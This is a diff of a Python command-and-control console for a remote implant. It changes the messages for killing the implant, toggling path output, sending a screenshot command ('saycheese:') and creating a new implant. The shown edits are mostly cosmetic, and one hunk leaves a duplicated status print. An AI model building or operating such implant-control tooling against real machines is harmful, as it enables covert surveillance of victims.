@@ -615,7 +615,7 @@ def killimplant(clean):
         "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
         "Upgrade-Insecure-Requests": "1"}
     response = requests.get(url, headers=headers)
-    print(Fore.BLUE + "[!]" + Fore.RESET + " Exiting... Bye!")
+    print(Fore.BLUE + "[!]" + Fore.RESET + " Implant Killed!\n")
 
 
 def animate():
@@ -732,7 +732,12 @@ def main():
             elif cmd.lower() == "pwd":
                 if connected == True:
                     print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
-                    pwd = True
+                    if pwd == False:
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
+                        pwd = True
+                    else:
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Removing current path from output")
+                        pwd = False
                 else:
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
@@ -775,7 +780,7 @@ def main():
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
                     fallback()
                     time.sleep(1)
-                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Sending screenshot command...")
+                    print(Fore.BLUE + "[!]" + Fore.RESET + " Sending screenshot command...")
                     taskCommand("saycheese:")
                     lastdictsize = getResults(lastdictsize)
                 else:
@@ -795,7 +800,7 @@ def main():
 
 
             elif cmd.lower() == "create-implant":
-                if (canaryManagementURL != ""):
+                if (connected == True):
                     print(
                         Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a connected implant. If you create a new one, you will lose the old one.")
                     choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
